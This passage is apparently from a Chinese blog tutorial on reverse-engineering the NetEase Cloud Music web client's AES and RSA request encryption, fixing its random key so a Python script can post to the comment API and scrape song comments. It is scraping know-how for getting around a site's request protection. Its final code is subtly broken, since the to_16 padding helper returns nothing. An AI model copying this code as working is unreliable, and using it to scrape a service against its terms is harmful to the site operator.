data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074203.jpg"                      alt="image-20220915011447650"                ></p><p>​    得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encSecKey：&quot;a7ef208899da73d457083e5186f7781531cc6bd374b789ee7023ea8251c30f2974a234fa63bd1d70580f4efaffdcae6e4ef273346099d9cfab045722b9d4464e12ff2ad867b11a46adeec7a6880a004a2bd25c2c4e3357b40865702ee7695b814a9ce28c978f17fc55cc8f157dd25073ea5b5a60fcc322a74d1b88ff43db4091&quot;</span><br></pre></td></tr></table></figure><p>​    把js全部理清之后得到这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)</span></span><br><span class="line"><span class="comment"># 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey</span></span><br><span class="line"><span class="comment"># 3.请求到网易，拿到评论信息</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求方式是post,拿真实参数</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cursor&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;orderType&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageNo&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageSize&quot;</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rid&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span>,</span><br><span class="line">    <span class="string">&quot;threadId&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f = <span class="string">&quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3&quot;</span> \</span><br><span class="line">    <span class="string">&quot;ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557&quot;</span> \</span><br><span class="line">    <span class="string">&quot;c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e8&quot;</span> \</span><br><span class="line">    <span class="string">&quot;2047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 &quot;</span></span><br><span class="line">g = <span class="string">&quot;0CoJUm6Qyw8W8jud&quot;</span></span><br><span class="line">e = <span class="string">&quot;010001&quot;</span></span><br><span class="line">i = <span class="string">&quot;jVQn8x1vCuwKtrdO&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encSeckey</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;a7ef208899da73d457083e5186f7781531cc6bd374b789ee7023ea8251c&quot;</span> \</span><br><span class="line">           <span class="string">&quot;30f2974a234fa63bd1d70580f4efaffdcae6e4ef273346099d9cfab0457&quot;</span> \</span><br><span class="line">           <span class="string">&quot;22b9d4464e12ff2ad867b11a46adeec7a6880a004a2bd25c2c4e3357b40&quot;</span> \</span><br><span class="line">           <span class="string">&quot;865702ee7695b814a9ce28c978f17fc55cc8f157dd25073ea5b5a60fcc3&quot;</span> \</span><br><span class="line">           <span class="string">&quot;22a74d1b88ff43db4091&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理加密过程</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function a(a = 16) &#123;</span></span><br><span class="line"><span class="string">        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span></span><br><span class="line"><span class="string">        for (d = 0; a &gt; d; d += 1) # 循环16次</span></span><br><span class="line"><span class="string">            e = Math.random() * b.length, # 随机数，假如是 1.2345</span></span><br><span class="line"><span class="string">            e = Math.floor(e), # 取整 ，假设下会变为 1</span></span><br><span class="line"><span class="string">            c += b.charAt(e); # 取字符串中的xxx位置 假设下会拿出字母b</span></span><br><span class="line"><span class="string">        return c #产生随机的16位字符串</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function b(a, b) &#123; # a是要加密的内容</span></span><br><span class="line"><span class="string">        var c = CryptoJS.enc.Utf8.parse(b) # b是密钥</span></span><br><span class="line"><span class="string">          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)</span></span><br><span class="line"><span class="string">          , e = CryptoJS.enc.Utf8.parse(a) # e是数据</span></span><br><span class="line"><span class="string">          , f = CryptoJS.AES.encrypt(e, c, &#123;   # c是加密的密钥</span></span><br><span class="line"><span class="string">            iv: d, # 偏移量</span></span><br><span class="line"><span class="string">            mode: CryptoJS.mode.CBC #CBC模式加密</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">        return f.toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function c(a, b, c) &#123;   #c不产生随机数</span></span><br><span class="line"><span class="string">        var d, e;</span></span><br><span class="line"><span class="string">        return setMaxDigits(131),</span></span><br><span class="line"><span class="string">        d = new RSAKeyPair(b,&quot;&quot;,c),</span></span><br><span class="line"><span class="string">        e = encryptedString(d, a)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">d:数据</span></span><br><span class="line"><span class="string">e:010001</span></span><br><span class="line"><span class="string">f:&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span></span><br><span class="line"><span class="string">g:&#x27;0CoJUm6Qyw8W8jud&#x27;</span></span><br><span class="line"><span class="string">    function d(d, e, f, g) &#123;</span></span><br><span class="line"><span class="string">        var h = &#123;&#125; #h现在是空对象</span></span><br><span class="line"><span class="string">          , i = a(16); #根据a函数，可以发现i为16位的随机值，我们就要把i想办法设置为定值</span></span><br><span class="line"><span class="string">        return h.encText = b(d, g), # g就是密钥</span></span><br><span class="line"><span class="string">        h.encText = b(h.encText, i),  #返回的就是params,流程是：数据+g =&gt; b() =&gt; 第一次加密+i =&gt; b() =&gt; params , i也是密钥</span></span><br><span class="line"><span class="string">        h.encSecKey = c(i, e, f), #得到encSecKey,e和f是定死的，c函数也没有随机数产生，所以只取决于i。如果此时把i设置为定值，encSeckey就固定了</span></span><br><span class="line"><span class="string">        h</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function e(a, b, d, e) &#123;</span></span><br><span class="line"><span class="string">        var f = &#123;&#125;;</span></span><br><span class="line"><span class="string">        return f.encText = c(a + e, b, d),</span></span><br><span class="line"><span class="string">        f</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>​    下面写代码，注意data是字典，而get_params接受字符串，我们需要用json转一下格式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)</span></span><br><span class="line"><span class="comment"># 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey</span></span><br><span class="line"><span class="comment"># 3.请求到网易，拿到评论信息</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求方式是post,拿真实参数</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cursor&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;orderType&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageNo&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageSize&quot;</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rid&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span>,</span><br><span class="line">    <span class="string">&quot;threadId&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f = <span class="string">&quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3&quot;</span> \</span><br><span class="line">    <span class="string">&quot;ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557&quot;</span> \</span><br><span class="line">    <span class="string">&quot;c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e8&quot;</span> \</span><br><span class="line">    <span class="string">&quot;2047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 &quot;</span></span><br><span class="line">g = <span class="string">&quot;0CoJUm6Qyw8W8jud&quot;</span></span><br><span class="line">e = <span class="string">&quot;010001&quot;</span></span><br><span class="line">i = <span class="string">&quot;jVQn8x1vCuwKtrdO&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encSeckey</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;a7ef208899da73d457083e5186f7781531cc6bd374b789ee7023ea8251c&quot;</span> \</span><br><span class="line">           <span class="string">&quot;30f2974a234fa63bd1d70580f4efaffdcae6e4ef273346099d9cfab0457&quot;</span> \</span><br><span class="line">           <span class="string">&quot;22b9d4464e12ff2ad867b11a46adeec7a6880a004a2bd25c2c4e3357b40&quot;</span> \</span><br><span class="line">           <span class="string">&quot;865702ee7695b814a9ce28c978f17fc55cc8f157dd25073ea5b5a60fcc3&quot;</span> \</span><br><span class="line">           <span class="string">&quot;22a74d1b88ff43db4091&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_params</span>(<span class="params">data</span>):  <span class="comment"># 默认收到的是字符串</span></span><br><span class="line">    first = enc_params(data, g)</span><br><span class="line">    second = enc_params(first, i)</span><br><span class="line">    <span class="keyword">return</span> second  <span class="comment"># 返回的就是params</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密过程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_params</span>(<span class="params">data, key</span>):</span><br><span class="line">    iv = <span class="string">&quot;0102030405060708&quot;</span></span><br><span class="line">    aes = AES.new(key=key.encode(<span class="string">&#x27;utf-8&#x27;</span>), IV=iv.encode(<span class="string">&#x27;utf-8&#x27;</span>), mode=AES.MODE_CBC)  <span class="comment"># 创建加密器</span></span><br><span class="line">    bs = aes.encrypt(data)  <span class="comment"># 加密，得到字节</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(b64encode(bs), <span class="string">&quot;utf-8&quot;</span>)  <span class="comment"># 转化成字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = requests.post(url, data=&#123;</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: get_params(json.dumps(data)),</span><br><span class="line">    <span class="string">&quot;encSecKey&quot;</span>: get_encSeckey()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理加密过程</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function a(a = 16) &#123;</span></span><br><span class="line"><span class="string">        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span></span><br><span class="line"><span class="string">        for (d = 0; a &gt; d; d += 1) # 循环16次</span></span><br><span class="line"><span class="string">            e = Math.random() * b.length, # 随机数，假如是 1.2345</span></span><br><span class="line"><span class="string">            e = Math.floor(e), # 取整 ，假设下会变为 1</span></span><br><span class="line"><span class="string">            c += b.charAt(e); # 取字符串中的xxx位置 假设下会拿出字母b</span></span><br><span class="line"><span class="string">        return c #产生随机的16位字符串</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function b(a, b) &#123; # a是要加密的内容</span></span><br><span class="line"><span class="string">        var c = CryptoJS.enc.Utf8.parse(b) # b是密钥</span></span><br><span class="line"><span class="string">          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)</span></span><br><span class="line"><span class="string">          , e = CryptoJS.enc.Utf8.parse(a) # e是数据</span></span><br><span class="line"><span class="string">          , f = CryptoJS.AES.encrypt(e, c, &#123;   # c是加密的密钥</span></span><br><span class="line"><span class="string">            iv: d, # 偏移量</span></span><br><span class="line"><span class="string">            mode: CryptoJS.mode.CBC #CBC模式加密</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">        return f.toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function c(a, b, c) &#123;   #c不产生随机数</span></span><br><span class="line"><span class="string">        var d, e;</span></span><br><span class="line"><span class="string">        return setMaxDigits(131),</span></span><br><span class="line"><span class="string">        d = new RSAKeyPair(b,&quot;&quot;,c),</span></span><br><span class="line"><span class="string">        e = encryptedString(d, a)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">d:数据</span></span><br><span class="line"><span class="string">e:010001</span></span><br><span class="line"><span class="string">f:&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span></span><br><span class="line"><span class="string">g:&#x27;0CoJUm6Qyw8W8jud&#x27;</span></span><br><span class="line"><span class="string">    function d(d, e, f, g) &#123;</span></span><br><span class="line"><span class="string">        var h = &#123;&#125; #h现在是空对象</span></span><br><span class="line"><span class="string">          , i = a(16); #根据a函数，可以发现i为16位的随机值，我们就要把i想办法设置为定值</span></span><br><span class="line"><span class="string">        return h.encText = b(d, g), # g就是密钥</span></span><br><span class="line"><span class="string">        h.encText = b(h.encText, i),  #返回的就是params,流程是：数据+g =&gt; b() =&gt; 第一次加密+i =&gt; b() =&gt; params , i也是密钥</span></span><br><span class="line"><span class="string">        h.encSecKey = c(i, e, f), #得到encSecKey,e和f是定死的，c函数也没有随机数产生，所以只取决于i。如果此时把i设置为定值，encSeckey就固定了</span></span><br><span class="line"><span class="string">        h</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function e(a, b, d, e) &#123;</span></span><br><span class="line"><span class="string">        var f = &#123;&#125;;</span></span><br><span class="line"><span class="string">        return f.encText = c(a + e, b, d),</span></span><br><span class="line"><span class="string">        f</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074205.jpg"                      alt="image-20220915020643346"                ></p><p>​    好了我们运行一下，应该没问题了吧，寄</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074206.jpg"                      alt="image-20220915020743173"                ></p><p>​    看看，原来是加密的长度必须是16的倍数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)</span></span><br><span class="line"><span class="comment"># 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey</span></span><br><span class="line"><span class="comment"># 3.请求到网易，拿到评论信息</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求方式是post,拿真实参数</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cursor&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;orderType&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageNo&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageSize&quot;</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rid&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span>,</span><br><span class="line">    <span class="string">&quot;threadId&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f = <span class="string">&quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3&quot;</span> \</span><br><span class="line">    <span class="string">&quot;ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557&quot;</span> \</span><br><span class="line">    <span class="string">&quot;c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e8&quot;</span> \</span><br><span class="line">    <span class="string">&quot;2047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 &quot;</span></span><br><span class="line">g = <span class="string">&quot;0CoJUm6Qyw8W8jud&quot;</span></span><br><span class="line">e = <span class="string">&quot;010001&quot;</span></span><br><span class="line">i = <span class="string">&quot;jVQn8x1vCuwKtrdO&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encSeckey</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;a7ef208899da73d457083e5186f7781531cc6bd374b789ee7023ea8251c&quot;</span> \</span><br><span class="line">           <span class="string">&quot;30f2974a234fa63bd1d70580f4efaffdcae6e4ef273346099d9cfab0457&quot;</span> \</span><br><span class="line">           <span class="string">&quot;22b9d4464e12ff2ad867b11a46adeec7a6880a004a2bd25c2c4e3357b40&quot;</span> \</span><br><span class="line">           <span class="string">&quot;865702ee7695b814a9ce28c978f17fc55cc8f157dd25073ea5b5a60fcc3&quot;</span> \</span><br><span class="line">           <span class="string">&quot;22a74d1b88ff43db4091&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_params</span>(<span class="params">data</span>):  <span class="comment"># 默认收到的是字符串</span></span><br><span class="line">    first = enc_params(data, g)</span><br><span class="line">    second = enc_params(first, i)</span><br><span class="line">    <span class="keyword">return</span> second  <span class="comment"># 返回的就是params</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_16</span>(<span class="params">data</span>):</span><br><span class="line">    pad = <span class="number">16</span> - <span class="built_in">len</span>(data) % <span class="number">16</span></span><br><span class="line">    data += <span class="built_in">chr</span>(pad) * pad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密过程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_params</span>(<span class="params">data, key</span>):</span><br><span class="line">    iv = <span class="string">&quot;0102030405060708&quot;</span></span><br><span class="line">    aes = AES.new(key=key.encode(<span class="string">&#x27;utf-8&#x27;</span>), IV=iv.encode(<span class="string">&#x27;utf-8&#x27;</span>), mode=AES.MODE_CBC)  <span class="comment"># 创建加密器</span></span><br><span class="line">    data = to_16(data)</span><br><span class="line">    bs = aes.encrypt(data)  <span class="comment"># 加密，得到字节,加密的长度必须是16的倍数 &quot;123456789abcdfgh chr(16)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(b64encode(bs), <span class="string">&quot;utf-8&quot;</span>)  <span class="comment"># 转化成字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = requests.post(url, data=&#123;</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: get_params(json.dumps(data)),</span><br><span class="line">    <span class="string">&quot;encSecKey&quot;</span>: get_encSeckey()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理加密过程</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function a(a = 16) &#123;</span></span><br><span class="line"><span class="string">        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span></span><br><span class="line"><span class="string">        for (d = 0; a &gt; d; d += 1) # 循环16次</span></span><br><span class="line"><span class="string">            e = Math.random() * b.length, # 随机数，假如是 1.2345</span></span><br><span class="line"><span class="string">            e = Math.floor(e), # 取整 ，假设下会变为 1</span></span><br><span class="line"><span class="string">            c += b.charAt(e); # 取字符串中的xxx位置 假设下会拿出字母b</span></span><br><span class="line"><span class="string">        return c #产生随机的16位字符串</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function b(a, b) &#123; # a是要加密的内容</span></span><br><span class="line"><span class="string">        var c = CryptoJS.enc.Utf8.parse(b) # b是密钥</span></span><br><span class="line"><span class="string">          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)</span></span><br><span class="line"><span class="string">          , e = CryptoJS.enc.Utf8.parse(a) # e是数据</span></span><br><span class="line"><span class="string">          , f = CryptoJS.AES.encrypt(e, c, &#123;   # c是加密的密钥</span></span><br><span class="line"><span class="string">            iv: d, # 偏移量</span></span><br><span class="line"><span class="string">            mode: CryptoJS.mode.CBC #CBC模式加密</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">        return f.toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function c(a, b, c) &#123;   #c不产生随机数</span></span><br><span class="line"><span class="string">        var d, e;</span></span><br><span class="line"><span class="string">        